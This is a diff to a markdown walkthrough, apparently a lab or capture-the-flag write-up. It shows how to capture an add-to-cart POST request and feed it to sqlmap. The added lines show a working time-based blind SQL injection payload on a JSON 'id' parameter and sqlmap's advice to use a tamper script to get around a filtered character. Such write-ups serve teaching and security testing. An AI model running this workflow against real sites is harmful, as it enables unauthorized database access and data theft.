@@ -59,8 +59,6 @@ If we search for "add-to-cart", we'll see its linked to these buttons:
     <img width="1013" height="925" alt="addtocart" src="https://github.com/user-attachments/assets/a680f027-eb3b-4f84-94b5-2d9c6f0f53c1" />
 </p>
 
-
-
 Lets target this form, first we'll make a request.txt, for this go to DevTools, then the Network tab, right click on the POST entry, and click on Copy Values, then click on Copy Request Headers.
 
 Paste the values into request.txt,
@@ -75,6 +73,20 @@ Then go back and Copy POST Data and add it the request file.
 Now that the request file, has been made see if we can get an injection.
 
     sqlmap --threads=10 --batch -r request.txt --random-agent
+
+
+The scan reveals that the form is injectable.
+
+    ---
+    Parameter: JSON id ((custom) POST)
+        Type: time-based blind
+        Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+        Payload: {"id":"1 AND (SELECT 2014 FROM (SELECT(SLEEP(5)))Bicq)"}
+    ---
+
+However we do also have this warning:
+
+    [WARNING] it appears that the character '>' is filtered by the back-end server. You are strongly advised to rerun with the '--tamper=between'
 
 
 
